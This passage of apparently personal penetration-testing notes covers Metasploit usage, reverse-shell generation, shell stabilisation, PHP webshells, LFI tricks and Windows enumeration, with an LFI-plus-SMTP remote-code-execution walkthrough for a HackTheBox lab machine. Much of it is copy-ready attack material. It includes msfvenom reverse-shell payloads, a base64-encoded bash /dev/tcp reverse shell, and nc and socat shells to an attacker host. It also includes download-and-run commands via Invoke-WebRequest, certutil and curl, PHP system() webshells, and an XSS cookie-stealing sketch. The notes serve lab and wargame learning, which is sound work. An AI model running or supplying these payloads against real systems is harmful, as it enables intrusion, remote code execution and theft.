<li>perm 644 for a pub_key </li> <li>private key DOES NOT go on the target; but perm 600 for id_rsa</li> <li>home directory is usally at most perm 755</li> </ul> <p>modify the <code>motd</code> file to refresh your persistence. <code>motd</code> is a bash script that runs upon login.</p>"},{"location":"linux/proc-pseudo-file-system/","title":"proc-pseudo-file-system","text":"<p>These entries are most effective for operations within a docker container. These entries should be considered when a means of information disclosure is available. Thorough enumeration of the <code>/proc</code> file system arbitrary read can lead to full system compromise.</p>"},{"location":"linux/proc-pseudo-file-system/#procnettcp","title":"/proc/net/tcp","text":"<p>This is where we can find information on the current TCP connections and listening sockets. When tools like <code>netstat</code> and <code>ss</code> are not included in a container, we can still get information out of this file. Note that address are usually represented in hexadecimal, convert accordingly. </p>"},{"location":"linux/proc-pseudo-file-system/#procscheddebug","title":"/proc/sched/debug","text":"<p>Information on current running processes. Discloses all running services at point of read. </p> <ul> <li>process id numbers</li> <li>parent PID</li> <li>command lines</li> </ul> <p>This entry is great for pivot enumerations. Use this file to determine the PID of a process running on target system, pivot to enumerating <code>/proc/DISCOVERED_PID</code></p>"},{"location":"linux/proc-pseudo-file-system/#procprocess_idmaps","title":"/proc/PROCESS_ID/maps","text":"<p>Memory addresses of <code>PROCESS_ID</code>. This entry is mission critical if the target binary does not implement address space randomization per thread. Enables address calculations for things such as <code>libc</code> strings for return oriented programming exploits. </p> <ul> <li><code>offset_of_libc_string_in_image + addr_of_libc_in_memory = addr_in_memory</code></li> </ul>"},{"location":"metasploit_framework/index-of-metasploit_framework/","title":"Index of metasploit framework","text":"<ul> <li>msfvenom</li> <li>searchsploit</li> <li>msfconsole</li> </ul>"},{"location":"metasploit_framework/msfconsole/","title":"msfconsole","text":"<p>This section contains interesting quirks/tricks to the msfconsole. May include some basic usage guides. </p>"},{"location":"metasploit_framework/msfconsole/#issues-with-process-migration","title":"issues with process migration","text":"<p>The case study is the exploit suggester for Windows targets. The suggester should be run in both 32 bit and 64 bit modules, as the results may differ. The attack surface will be the union of the sets of the outputs. </p> <p>migration from 32 to 64 may cause subsequent exploits to fail, silently, or with minimal feedback. Process migration is appropriate if attempting to avoid detection or if exploit suggester module is not necessary. Migrating to a process of the same architecture is advised. </p> <p>Example workflow, full enumeration</p> <ol> <li>Catch a 32 bit meterpreter shell</li> <li>Run 32 bit suggester via 32 bit meterpreter shell</li> <li>Catch a 64 bit meterpreter shell, we now have two distinct sessions</li> <li>run 64 bit suggester via meterpreter shell</li> <li>Analyze the suggested attack surface </li> <li>Run exploits in the according 32 or 64 bit sessions</li> </ol> <p>Opsec to be considered </p> <ul> <li>additional noise in the process tree of multiple sessions</li> <li>more disk traces to clean up, we have a 32 and 64 bit agent present</li> </ul>"},{"location":"metasploit_framework/msfconsole/#get-prettyextended-exploit-info","title":"get pretty/extended exploit info","text":"<p>Use this command to generate a <code>.HTML</code> doc in <code>/tmp</code> for nicer, more detailed viewing</p> <pre><code>info -d \n</code></pre>"},{"location":"metasploit_framework/msfconsole/#enable-pivoting","title":"enable pivoting","text":""},{"location":"metasploit_framework/msfconsole/#socks4-and-proxychains","title":"socks4 and proxychains","text":"<p>Metasploit has a socks_proxy server function, which enables for easy routing of our traffic through our agents.</p>"},{"location":"metasploit_framework/msfconsole/#setup","title":"setup","text":"<p>First we must define some routes, the general syntax is</p> <pre><code>route ADD/DEL IP_ADDR/SUBNET_CIDR SESSION_TO_ROUTE_THROUGH\n</code></pre> <p>Example routes</p> <pre><code>route add 172.17.0.1/32 -1\nroute add 172.28.101.51/32 -1\nroute print\n</code></pre> <p>Once routes are set, we can start the service. Note the <code>version=4a</code></p> <pre><code>use auxiliary/server/socks_proxy\nauxiliary(server/socks_proxy) &gt; run srvhost=127.0.0.1 srvport=9050 version=4a\n</code></pre>"},{"location":"metasploit_framework/msfconsole/#example-usage","title":"example usage","text":"<p>in msfconsole. Note server must be running and route defined. </p> <pre><code>msf6 auxiliary(scanner/ssh/ssh_login) &gt; run ssh://USERNAME:PASSWORD@172.17.0.1   \n</code></pre> <p>on command line tools</p> <pre><code>curl --proxy socks4a://localhost:9050 http://172.17.0.1 -v\n</code></pre> <p>make sure <code>/etc/proxchains.conf</code> is set to v4 not v5!</p> <pre><code>proxychains -q nmap -n -sT -Pn -p 22,80,443,5432 172.17.0.1\n</code></pre> <pre><code>proxychains ssh USERNAME@172.17.0.1   \n</code></pre>"},{"location":"metasploit_framework/msfvenom/","title":"msfvenom","text":"<p>Windows reverse shell; defaults to x86 i.e. 32bit</p> <pre><code>msfvenom -p windows/shell_reverse_tcp lhost=&lt;MY_IP&gt; lport=9001 -f exe &gt; Service_system_update.exe\n</code></pre> <ul> <li>avoid the meterpreter payloads, they require Metasploit handler to catch them</li> <li>note the _ separating the terms; this indicates STAGELESS payloads i.e., no Metasploit needed to catch</li> </ul> <p>creating shellcode for a Linux target</p> <pre><code>msfvenom -a x64 -p linux/x64/shell_reverse_tcp -b \"\\x00\" -f c LHOST=10.10.10.10 LPORT=8000\n</code></pre>"},{"location":"metasploit_framework/searchsploit/","title":"searchsploit cheat sheet","text":"<ul> <li><code>searchsploit -x PATH</code>        ; gives explanation</li> <li><code>searchsploit -m PATH</code>        ; makes a copy of the exploit in current directory</li> </ul>"},{"location":"report_writing/index-of-report_writing/","title":"Index of report writing","text":"<ul> <li>md_cheatsheet</li> <li>report_writing-home</li> </ul>"},{"location":"report_writing/md_cheatsheet/","title":"Md cheatsheet","text":""},{"location":"report_writing/md_cheatsheet/#heading-1","title":"Heading 1","text":""},{"location":"report_writing/md_cheatsheet/#heading-2","title":"Heading 2","text":""},{"location":"report_writing/md_cheatsheet/#heading-3","title":"Heading 3","text":""},{"location":"report_writing/md_cheatsheet/#heading-4","title":"Heading 4","text":""},{"location":"report_writing/md_cheatsheet/#heading-5","title":"Heading 5","text":""},{"location":"report_writing/md_cheatsheet/#heading-6","title":"Heading 6","text":"<p>This text is italic</p> <p>This text is italic</p> <p>This text is italic</p> <p>This text is italic</p> <p>This text is strikethrough</p> <p>This is a quote</p> <p>Traversy Media</p> <p>Traversy Media</p> <ul> <li>Item 1</li> <li>Item 2</li> <li>Item 3</li> <li>Nested Item 1</li> <li>Nested Item 2</li> </ul> <ol> <li>Item 1</li> <li>Item 2</li> <li>Item 3</li> </ol> <p><code>&lt;p&gt;This is a paragraph&lt;/p&gt;</code></p> <p></p> <pre><code>  npm install\n\n  npm start\n</code></pre> <pre><code>  function add(num1, num2) {\n    return num1 + num2;\n  }\n</code></pre> <pre><code>  def add(num1, num2):\n    return num1 + num2\n</code></pre> <p>note that the first 2 lines must line up nicely, also no subcollumns</p> Name Email John Doe john@gmail.com Jane Doe jane@gmail.com <ul> <li> Task 1</li> <li> Task 2</li> <li> Task 3</li> </ul> <p>picture </p>"},{"location":"report_writing/report_writing-home/","title":"Report writing home","text":""},{"location":"report_writing/report_writing-home/#style-guide","title":"Style Guide","text":"<p>The following are good references for style. They include examples and direct advice for writing.</p>"},{"location":"report_writing/report_writing-home/#advice","title":"Advice","text":"<ul> <li>https://www.robertmlee.org/structuring-cyber-threat-intelligence-assessments-musings-and-recommendations/</li> </ul>"},{"location":"report_writing/report_writing-home/#examples","title":"Examples","text":"<ul> <li>https://www.mandiant.com/resources/blog/gru-rise-telegram-minions</li> </ul>"},{"location":"report_writing/report_writing-home/#key-takeaways","title":"Key Takeaways","text":""},{"location":"report_writing/report_writing-home/#language-is-important-be-concise","title":"Language is Important; Be Concise","text":""},{"location":"report_writing/report_writing-home/#know-your-audience","title":"Know Your Audience","text":"<p>Does this piece have a need for an executive summary? Is the audience tecnical, what should be shown and what should be left to the reader? Why does this writing exist?</p>"},{"location":"shells/C2-Frameworks/","title":"C2-Frameworks","text":""},{"location":"shells/C2-Frameworks/#metasploit-msfvenom","title":"Metasploit - MSFVENOM","text":""},{"location":"shells/C2-Frameworks/#example-procedure","title":"example procedure","text":"<p>e.g.  <code>msfvenom --list payloads | grep \"linux/x86/meterpreter\"</code></p> <p><code>msfvenom -p windows/x64/shell/reverse_tcp -f exe -o shell.exe LHOST=&lt;listen-IP&gt; LPORT=&lt;listen-port&gt;</code></p> <p>notice 1. -f format 2. -o output_file 3. -p payload os/arch/payload</p>"},{"location":"shells/C2-Frameworks/#some-nuance-and-gotchas","title":"some nuance and gotchas","text":"<ul> <li>Payloads with <code>shell/reverse_tcp</code> are staged  </li> <li>Payloads with <code>shell_reverse_tcp</code> are unstaged </li> <li>sometimes it says meterpreter instead of shell, these require the meterpreter multihandler to catch them</li> <li>notice the <code>/_</code> between shell and reverse<ul> <li><code>/</code> is staged</li> <li><code>_</code> is not staged</li> </ul> </li> </ul>"},{"location":"shells/index-of-shells/","title":"Index of shells","text":"<ul> <li>link_dump</li> <li>shells-home</li> <li>shell_upgrades</li> <li>windows_shells</li> <li>webshells</li> <li>C2-Frameworks</li> </ul>"},{"location":"shells/link_dump/","title":"shell resources","text":""},{"location":"shells/link_dump/#shell-generator-for-lazies","title":"shell generator for lazies","text":"<p>https://www.revshells.com/ </p>"},{"location":"shells/link_dump/#mega-repository-basically-a-museum","title":"mega repository; basically a museum","text":"<p>https://github.com/tennc/webshell</p>"},{"location":"shells/link_dump/#shell-cheatsheet","title":"Shell cheatsheet","text":"<p>https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md </p>"},{"location":"shells/shell_upgrades/","title":"shell_upgrades","text":""},{"location":"shells/shell_upgrades/#this-is-what-you-came-here-for","title":"this is what you came here for","text":"<pre><code>python3 -c 'import pty;pty.spawn(\"/bin/bash\")'\nexport TERM=xterm\nstty rows 37 cols 172\n</code></pre> <p>follow this with <code>CTRL+Z</code> then   <code>stty raw -echo;fg</code> <code>ENTER ENTER</code></p>"},{"location":"shells/shell_upgrades/#technique-0-script","title":"Technique 0: script","text":"<p>kind of like a poor version of python/rlwrap stty does NOT behave nicely so it can cause display issues</p> <p>once your shell has landed; ONLY WORKS IF <code>script</code> is present on the target unix system</p> <pre><code>script /dev/null -c bash\n\nexplanation\n    script      ; binary we run\n    /dev/null   ; the log file location\n    -c bash     ; the command we will be logging\n</code></pre> <p>my preference is to have a \"fragile shell\" but with rlwrap the display issues script brings are NOT worth it display issues cause too much lost information</p> <p>my 'lost information' experience may be box/system specific to a single instance</p> <p>alternate 'script' upgrade</p> <pre><code># catch the reverse shell\nscript -q bash\nctrl + Z \nstty raw -echo; fg \nexport TERM=xterm\nbash\n# 2nd bash may not be needed\n</code></pre>"},{"location":"shells/shell_upgrades/#technique-1-python","title":"Technique 1: python","text":"<pre><code>python -c 'import pty;pty.spawn(\"/bin/bash\")' \nexport TERM=xterm -- this will give us access to term commands such as clear. \nCtrl + Z. (background the shell on attacker machine)\nstty raw -echo; fg \n[LOCAL] stty -a  ; take note of row col\n[REV_SHELL] stty rows LOCAL_ROW columns LOCAL_COLS\n</code></pre> <p>Last 2 steps does two things:      first, it turns off our own terminal echo      (which gives us access to tab autocompletes, the arrow keys, and Ctrl + C).      It then foregrounds the shell, thus completing the process. </p>"},{"location":"shells/shell_upgrades/#technique-2-rlwrap","title":"Technique 2: rlwrap","text":"<p>Useful for Windows Shell stabilization (Notoriously difficult) Gives access to history, tab complete, arrow keys  NO ACCESS TO CTRL+C BY DEFAULT</p> <pre><code>rlwrap nc -lvnp &lt;port&gt;\nCtrl+Z; stty raw -echo; fg  (gives access to ctrl+c)\n</code></pre>"},{"location":"shells/shell_upgrades/#technique-3-socat","title":"Technique 3: socat","text":"<p>only useful VS linux. Syntax for Sending/Receiving is Unique to socat serve a socat static compiled binary (no dependencies)</p> <pre><code>Attacker: sudo python3 -m http.server 80    \nLinux Target: wget &lt;LOCAL-IP&gt;/socat -O /tmp/socat\nWindows Target: Invoke-WebRequest -uri &lt;LOCAL-IP&gt;/socat.exe -outfile C:\\\\Windows\\temp\\socat.exe\n</code></pre> <p>Note the windows command is an example of serving;  socat will not work for our purposes on windows</p> <p>Listener: socat TCP-L:\\&lt;port&gt; FILE:<code>tty</code>,raw,echo=0 Speaker: socat TCP:\\&lt;attacker-ip&gt;:\\&lt;attacker-port&gt; EXEC:\"bash -li\",pty,stderr,sigint,setsid,sane</p> <p>-d -d  added to command will increase verbosity (good for learning)</p> <p>Real world uses socat whenever possible; its possible to encrypt shell traffic Replace above TCP with OPENSSL. A bit involved, but worth learning NEXT.</p>"},{"location":"shells/shell_upgrades/#change-terminal-tty-size","title":"Change Terminal TTY Size","text":"<p>necessary for using progs which overwrite the screen (nano, vi, etc) Terminal does this automatically with a regular shell; must be manually done with a Reverse/Bind shell</p> <ul> <li>Attacker: stty -a       (Take note of rows/cols information)</li> <li>Target: stty rows    (info from attackbox)</li> <li>Target: stty cols    (info from attackbox)</li> </ul>"},{"location":"shells/shells-home/","title":"general methodology for sending shells","text":"<p>troubleshooting</p> <pre><code>verify command exectution with\n    'simple command'\n    'tcpdump + ping'\n\ntry supplying full path to files/binaries ( blind )\n\nstage the shell into 2 (requires write priv somewhere on system)\n    send\n    detonate\n\n</code></pre> <p>encoding payloads</p> <pre><code>windows\n    echo -n 'IEX(IWR....)' | iconv -t UTF-16LE | base64 -w 0\nlinux\n    echo -n 'bash -i &gt;&amp; /dev/tcp/MY_IP/MY_PORT' 0&gt;&amp;1' | base64\n</code></pre> <p>detonating encoded payloads</p> <pre><code>powershell -enc 'BASE_64_PAYLOAD'\n# \necho -n 'BASE_64_PAYLOAD' | base64 -d | bash        \n# note \"bash -c\" not necessary on this one, already in bash context\n</code></pre>"},{"location":"shells/webshells/","title":"php webshells","text":""},{"location":"shells/webshells/#discussion","title":"discussion","text":"<p>php site using php to show images, we can hide an shell in an image</p> <pre><code>if( isset( $_REQUEST['invae'] ) )\n{\n    system($_REQUEST['invae']);\n}\ndie(); \n</code></pre> <ul> <li><code>die()</code> removes the image garbage, making our shell easier to use</li> <li><code>$_REQUEST</code> is more friendly towards bad characters and thus code execution</li> </ul>"},{"location":"shells/webshells/#prepared-statements","title":"prepared statements","text":""},{"location":"shells/webshells/#php-request-one-liner","title":"php request one liner","text":"<ul> <li>usage: <code>GET</code> or <code>POST</code> request with data <code>shell.php?invae=ANYTHING&amp;cmd=COMMAND</code></li> </ul> <pre><code>&lt;?php  if( isset( $_REQUEST['invae'] ){ echo system( $_REQUEST['cmd'] ); } )/&gt;\n</code></pre>"},{"location":"shells/webshells/#php-request-multi-line","title":"php request multi-line","text":"<p>usage: <code>GET</code> or <code>POST</code> request with data <code>shell.php?invae=ANYTHING&amp;cmd=COMMAND</code></p> <pre><code>&lt;?php\n    if( isset($_REQUEST['invae']) )\n    {\n        echo system($_REQUEST['cmd']);\n    }\n?&gt;\n</code></pre>"},{"location":"shells/windows_shells/","title":"windows_shells","text":""},{"location":"shells/windows_shells/#serving-files-to-windows","title":"serving files to windows","text":"<p>invoke web request is simliar to curl; shell is being hosted on attacker with python3</p> <pre><code>Invoke-WebRequest -Uri http://&lt;LHOST&gt;:8000/shell.exe -OutFile ./shell.exe &amp;&amp; .\\shell.exe\n</code></pre> <p>Alternatively serve the shell with python on host and pull with curl/certutil on the target</p> <pre><code>curl http://ATTACKER_IP/reverse.exe -o \"FULL_PATH\"\ncertutil -urlcache -f http://ATTACKER_IP/FILE_TO_DOWNLOAD\n</code></pre>"},{"location":"shells/windows_shells/#netcat","title":"netcat","text":"<p>nc traditional</p> <pre><code>nc ATTACKER_IP ATTACKER PORT -e powershell                      ; works just like other shells\n</code></pre>"},{"location":"web/index-of-web/","title":"Index of web","text":"<ul> <li>index-of-web_enumeration</li> <li>index-of-weaponizing-common-vulnerabilities</li> </ul>"},{"location":"web/weaponizing-common-vulnerabilities/LFI-and-SMTP-gives-RCE/","title":"LFI-and-SMTP-gives-RCE","text":"<p>SMTP  poisoning</p>"},{"location":"web/weaponizing-common-vulnerabilities/LFI-and-SMTP-gives-RCE/#technique","title":"technique","text":"<p>The following are necessary to achieve RCE</p> <ol> <li>The server must have SMTP capability</li> <li>The service with the LFI vulnerability must be running as a user who can read mail</li> <li>The service with LFI must have a way to execute code, such as a php website.</li> </ol>"},{"location":"web/weaponizing-common-vulnerabilities/LFI-and-SMTP-gives-RCE/#procedure","title":"procedure","text":"<p>The following procedure was created by analysing ippsec's run through of the Trick HackTheBox machine. Subscribe to ippsec, watch on youtube.</p> <p>inspiration of post | Trick.htb | subscribe to ippsec</p> <p>The procedure consists of</p> <ol> <li>identifying that the webserver has read permission on a SMTP mailbox</li> <li>send mail to the mailbox, include a php payload as data. </li> <li>use LFI to detonate the php payload</li> </ol>"},{"location":"web/weaponizing-common-vulnerabilities/LFI-and-SMTP-gives-RCE/#read-permission-on-mail","title":"read permission on mail","text":"<p>First we identify the user running the webservice. This is done via the LFI and via the <code>/proc</code> file system.  </p> <p>note that the header <code>Range: bytes=200-1000</code> should be added before trying to include things from <code>/proc</code></p> <p>We enumerate the following files</p> <ul> <li><code>/proc/self/environ</code></li> <li><code>/proc/self/cmdline</code></li> </ul> <p>We discover that on <code>trick.htb</code> the webserver is running as <code>michael</code>. With SMTP running on the server, local users such as <code>michael</code> will have a mailbox at <code>/var/spool/mail/michael</code>, a file appended with mail messages. </p>"},{"location":"web/weaponizing-common-vulnerabilities/LFI-and-SMTP-gives-RCE/#send-mail","title":"send mail","text":"<p>The following commands are sent to the server in order to send the php payload. Commented lines are server responses</p> <pre><code>nc -v trick.htb 25\nehlo trick.htb\n# 250 2.1.0 OK\nmail from: &lt;ippsec@trick.htb&gt;\nrcpt to:michael\ndata\n# 354 End data with &lt;CR&gt;&lt;LF&gt;.&lt;CR&gt;&lt;LF&gt; \nsubject: Please Subscribe to ippsec\n\n&lt;?php system($_GET['cmd']); ?&gt;\n.\n\n# 250 2.0.0 OK: queued as 7D46C4099C\n</code></pre> <p>Note that </p> <ul> <li><code>rcpt to:</code> field is not as we expect. Above is how SMTP can send mail locally. <code>&lt;michale@trick.htb&gt;</code> fails on this lab machine. </li> <li><code># 354 End data with &lt;CR&gt;&lt;LF&gt;.&lt;CR&gt;&lt;LF&gt;</code> means that we end the <code>data</code> with <code>ENTER</code> <code>.</code> <code>ENTER</code> input</li> </ul>"},{"location":"web/weaponizing-common-vulnerabilities/LFI-and-SMTP-gives-RCE/#use-lfi-to-detonate-the-payload","title":"use LFI to detonate the payload","text":"<p>With the payload delivered, we can detonate via our LFI:</p> <pre><code>...//var/spool/mail/michael&amp;cmd=id\n</code></pre>"},{"location":"web/weaponizing-common-vulnerabilities/LFI-and-SMTP-gives-RCE/#summary","title":"summary","text":"<p>With exposed SMTP and no authentication, we can write arbitrary text files to the server. Subject to character limit and the presence of a mailbox. We use this to write a webshell to a readable mailbox. The php LFI is then used to include our webshell, which is interpreted by the server, granting us RCE. </p>"},{"location":"web/weaponizing-common-vulnerabilities/index-of-weaponizing-common-vulnerabilities/","title":"Index of weaponizing common vulnerabilities","text":"<ul> <li>purpose-of-weaponizing-common-vulnerabilities</li> <li>LFI-and-SMTP-gives-RCE</li> </ul>"},{"location":"web/weaponizing-common-vulnerabilities/purpose-of-weaponizing-common-vulnerabilities/","title":"purpose-of-weaponizing-common-vulnerabilities","text":""},{"location":"web/weaponizing-common-vulnerabilities/purpose-of-weaponizing-common-vulnerabilities/#declaration","title":"declaration","text":"<p>This directory will hold unique/novel weponization of vulnerabilites observed during wargames. </p>"},{"location":"web/weaponizing-common-vulnerabilities/purpose-of-weaponizing-common-vulnerabilities/#note","title":"note","text":"<p>It is important to note</p> <ul> <li>unique/novel is completely subjective </li> <li>unique/novel does not imply good/useful</li> </ul>"},{"location":"web/web_enumeration/creative_enumeration/","title":"creative enumeration methods","text":"<ul> <li><code>curl -v URL</code> as an enumeration tool; somtimes the site hides versions under popups (or is just not present in browser or source)</li> <li><code>netcat</code> for fingerprinting; can sometimes grab the banner for further research<ul> <li><code>nc -z</code>            zero-I/O mode used for scanning</li> </ul> </li> <li>python or php server to receive CSRF proofs</li> </ul>"},{"location":"web/web_enumeration/creative_enumeration/#local-enumeration-of-remote-site","title":"local enumeration of remote site","text":"<p>best for use against small sites; download the entire site!</p> <pre><code>wget --mirror --convert-links --adjust-extension --page-requisites --no-parent http://TARGET\n</code></pre> <p>this one works for git folders</p> <pre><code>wget  -R \"index.html*\" --mirror --convert-links --no-parent http://siteisup.htb/dev/.git/\n</code></pre> <p>idk if convert-links is necessary; note there is a lot of redundancy in these flags.</p>"},{"location":"web/web_enumeration/creative_enumeration/#fuzzing","title":"fuzzing","text":"<p>with FFUF</p> <pre><code>syntax is a bit easier than wfuzz\nnote the content type\nnote the cookies    \nnote the headers    \n\ncommon flags:\n    -H 'Name: Value'                        ; accept multiple\n    -x POST  default is GET\n    -d 'POST DATA'\n    -c colored output\n    -b \"NAME1=VALUE1; NAME2=VALUE2\"         ; cookie data\nexample: \n\nffuf -w /path/to/wordlist -u https://target/FUZZ\n\n</code></pre>"},{"location":"web/web_enumeration/creative_enumeration/#xss-cookie-stealing","title":"XSS cookie stealing","text":"<p>host a malicious js; attempts to steal cookie</p> <pre><code>script will contain something like:\n    document.Write('...'+doc...cookie...)\n\n/*\nwrites victim cookie into web request, cookie visible in 'GET request' / 'web server log'\n*/\n</code></pre>"},{"location":"web/web_enumeration/creative_enumeration/#notable-http-headers-wall-of-shame","title":"notable http headers - Wall of Shame","text":"<p>everytime I get owned by missing a particular header, I will add it to this list</p> <ul> <li><code>X-Powered-By</code></li> </ul>"},{"location":"web/web_enumeration/domain_enumeration/","title":"domain_enumeration","text":"<p>Discovering Virtual hosts is the goal; always hiding from me</p>"},{"location":"web/web_enumeration/domain_enumeration/#non-readable-dir-readble-contents","title":"non-readable dir, readble contents","text":"<p>Freqently associated with 403 Forbidden, directory listing may be disabled but reading/visiting contents may be allowed. </p> <p>use known extensions such as .txt or .php (given a php website) and dir search with gobuster</p> <pre><code>/usr/share/wordlists/dirb/common.txt \n</code></pre>"},{"location":"web/web_enumeration/domain_enumeration/#virtual-host-enumeration-techniques","title":"virtual host enumeration techniques","text":""},{"location":"web/web_enumeration/domain_enumeration/#creative-techniques","title":"creative techniques","text":"<pre><code>#look for deadlinks/broken images\n# reload with network developer tab open\n# read 404s for leaked subdomains (they are 404 b.c not yet in my etc/hosts)\n</code></pre>"},{"location":"web/web_enumeration/domain_enumeration/#fuzzing","title":"fuzzing","text":"<p>This is possible by FUZZing the Host header and measuring the responses. </p> <p>gobuster has vhost mode; good for finding subdomains on vhosts</p> <pre><code>Example wordlist\n/usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-5000.txt \n</code></pre> <p>also possible with ffuf and similar tools, be sure to match all status codes</p> <pre><code>ffuf -u http://$ip -w /path/to/wordlist/quark-subdomains.txt -H \"Host: FUZZ.target.com\" -mc all\n</code></pre>"},{"location":"web/web_enumeration/general_methodology/","title":"general_methodology","text":""},{"location":"web/web_enumeration/general_methodology/#take-note-of-actions","title":"take note of actions","text":"<p>Actions on the site should be interecepted and analyzed.  Anything that results in a change in the state of the site, session, or database has potential for abuse. </p>"},{"location":"web/web_enumeration/general_methodology/#fuzzing","title":"fuzzing","text":"<p>Fuzz everything. Notable targets include</p> <ul> <li>APIs<ul> <li>fuzz for functions</li> <li>fuzz for parameters</li> </ul> </li> <li>Data posted to an app that modifies a database, such as registration, or changing fields<ul> <li>fuzz for bad characters</li> <li>fuzz for sequential parameters (IDOR type bugs)</li> </ul> </li> </ul>"},{"location":"web/web_enumeration/index-of-web_enumeration/","title":"Index of web enumeration","text":"<ul> <li>creative_enumeration</li> <li>domain_enumeration</li> <li>php_flavor_site</li> <li>opensource_targets</li> <li>general_methodology</li> </ul>"},{"location":"web/web_enumeration/opensource_targets/","title":"opensource_targets","text":"<p>Opensource targets provide opportunity for unique enumeration techniques. Github, Subversion, or any other repository enables more passive enumeration techniques. Less interation with the target, more recon and research. </p>"},{"location":"web/web_enumeration/opensource_targets/#enumerating-versions","title":"enumerating versions","text":"<p>Try to find a file in the source code that containts the version number explicitly or implied. In this case an example of \"implied\" would be a feature change only implemented after some commit, thus we can estimate the the version number. If we exhaust all methods and devolve to throwing exploits at the target, any version to narrow the scope of exploits is useful for the sake of time. </p>"},{"location":"web/web_enumeration/php_flavor_site/","title":"php_flavor_site","text":""},{"location":"web/web_enumeration/php_flavor_site/#tips-and-notes-on-php-websites","title":"tips and notes on php websites","text":"<p>for testing proof of concept; debugging logic; understanding some script or shell code</p> <pre><code>php -a          ; enter php interactive mode, test the effects of syntax etc, etc\n</code></pre> <p>index.php</p> <pre><code>if it exists, the webiste is running php\n</code></pre> <p>if having trouble finding the <code>config.php</code> type files in post exploitation, search for these near top of the file</p> <pre><code>require_once( path/to/config.php );\n</code></pre>"},{"location":"web/web_enumeration/php_flavor_site/#common-php-website-vulnerabilities","title":"common php website vulnerabilities","text":""},{"location":"web/web_enumeration/php_flavor_site/#local-file-inclusion-lfi","title":"local file inclusion - LFI","text":"<p>defintion</p> <pre><code>when a website pulls a picture saved on the machine to display it\nwhen a website pulls another file and displays it\nthe website is misconfigured and is allowed to serve any file on the server\n</code></pre>"},{"location":"web/web_enumeration/php_flavor_site/#lfi-specific-techniques","title":"LFI specific techniques","text":"<p>hacktricks  |  everything LFI</p> <pre><code>/proc/self/cwd/KNOWN_FILE   ; for dealing with unknown path, but known dir contents\n</code></pre>"},{"location":"web/web_enumeration/php_flavor_site/#filters","title":"filters","text":"<p>Filters can be used to bypass limitations, such as a website executing the PHP code we are attempting to extract.</p> <pre><code>php://filter/convert.base64-encode/resource=PATH_TO_FILE    \n</code></pre> <p>The potential here is really spectacular, compressions filters such as <code>zlib.deflate</code> are particularly interesting.</p>"},{"location":"web/web_enumeration/php_flavor_site/#fuzzing-for-filesystem-readables","title":"fuzzing for filesystem readables","text":"<p>Once an LFI is identified, we can discover file system content via fuzzing. Here is a notable wordlist, deliver with your preferred tool:</p> <pre><code>/usr/share/wordlists/seclists/Fuzzing/LFI/LFI-gracefulsecurity-linux.txt\n</code></pre>"},{"location":"web/web_enumeration/php_flavor_site/#leverage-proc-file-system","title":"leverage /proc file system","text":"<p>The <code>/proc</code> file system, specifically the <code>/proc/self/</code> directory allows for a lot of creative results, here is a brief list of my favorites I have encountered so far.</p> <pre><code>/proc/self/cwd/FILE_WE_KNOW_EXISTS\n/proc/self/cmdline  # cmdline\n/proc/self/environ  # environment vars\n/proc/net/tcp       # budget netstat\n/proc/sched_debug   # running process and services\n/proc/PID/maps      # replace process id, access virt address for binary exploit\n</code></pre> <p>If these fail, consider adding the header <code>'Range: bytes=200-1000'</code>. I have frequently been advised that this solves some <code>/proc</code> LFI failures, specifically <code>/proc/self/environ</code>, but I have yet to experience this behavior myself. </p> <p>A note on <code>/proc/self/cwd</code>. It can be useful for jumping into <code>vhost</code>'d websites if we leverage relative path traversal. </p>"},{"location":"windows/index-of-windows/","title":"Index of windows","text":"<ul> <li>win_enumeration</li> <li>win_facts</li> <li>win_killchain</li> <li>win_toolset</li> <li>index-of-active-directory</li> </ul>"},{"location":"windows/win_enumeration/","title":"win_enumeration","text":"<p>This page serves as a reference to be used during operations. Included items are:</p> <ul> <li>checklists/skeletons of common enumerations loops</li> <li>prepared statements, ready for copy paste</li> <li>legacy reference notes, useful for writing and for when other methods have been exhausted</li> </ul>"},{"location":"windows/win_enumeration/#default-enumeration-activity","title":"default enumeration activity","text":"<p>Noisy,  lab use only. Campaigns should be planned, only necessary commands should touch the target</p>"},{"location":"windows/win_enumeration/#checklist","title":"checklist","text":"<ol> <li><code>systeminfo</code><ol> <li>we care about the most recent patch and build numbers</li> <li>in particular note the KB hotfix number</li> </ol> </li> <li><code>powershell -c 'dir env:'</code><ol> <li>userinfo </li> <li>env vars</li> </ol> </li> <li>Execute the following in order, parse the ouput carefully.<ol> <li><code>PowerUp.ps1</code></li> <li><code>SharpUp.exe</code></li> <li><code>WinPeasANY.exe</code></li> </ol> </li> <li>manual enumeration<ol> <li>focus on human activity</li> <li>scripts, notes, custom applications</li> <li>passwords written where they should not be</li> <li>review the ouput of enumeration scripts, they commonly miss the following<ol> <li><code>cmdkey /list</code></li> <li>scheduled tasks</li> <li>startup apps ( weak perms; running as system) </li> <li>access control permissions on registry services</li> <li>Saved credentials in tools such as <code>PuTTY</code></li> <li>credentials saved in registry keys</li> </ol> </li> </ol> </li> </ol>"},{"location":"windows/win_enumeration/#prepared-statements","title":"prepared statements","text":"<pre><code>systeminfo\n</code></pre> <p>The following should be executed in a powershell context</p> <pre><code>Get-Content $env:windir\\System32\\Drivers\\etc\\hosts\n</code></pre> <pre><code>Get-Content $env:appdata\\Microsoft\\Windows\\Powershell\\PSReadline\\ConsoleHost_history.txt\n</code></pre>"},{"location":"windows/win_enumeration/#manual-enumeration","title":"manual enumeration","text":"<p>When default activity is inappropriate or fails, we can conduct the following</p>"},{"location":"windows/win_enumeration/#prepared-statements_1","title":"prepared statements","text":"<p>find all services, not configured by windows (non-default services)</p> <pre><code>wmic service get name,displayname,pathname,startmode | findstr /v /i \"C:\\Windows\"\n</code></pre>"},{"location":"windows/win_enumeration/#powershell","title":"powershell","text":"<p>initial enumerations</p> <pre><code>get-localuser       # lists users\nget-localgroup      # lists groups\nget-childitem -recurse -Depth 1     # nice way to get \"tree\" output\nget-acl FILENAME    # shows owner+other stuff on directory/object pointed at\nGet-Service | Where-Object -Property Status -eq Running # running services   \n</code></pre> <p>serving files</p> <pre><code>all cmd commands should work\nalso `wget` is a common alias which creates the `Invoke-WebRequest` powershell equivalent\n</code></pre> <p>find command</p> <pre><code>get-childitem -force -recurse -path C:\\ -errorACtion SilentlyContinue -include *SEARCH_TERM*\n# https://devblogs.microsoft.com/scripting/use-windows-powershell-to-search-for-files/ \n</code></pre> <p>grep equivalent; this will search entire filesystem; albeit with a lot of terminal noise</p> 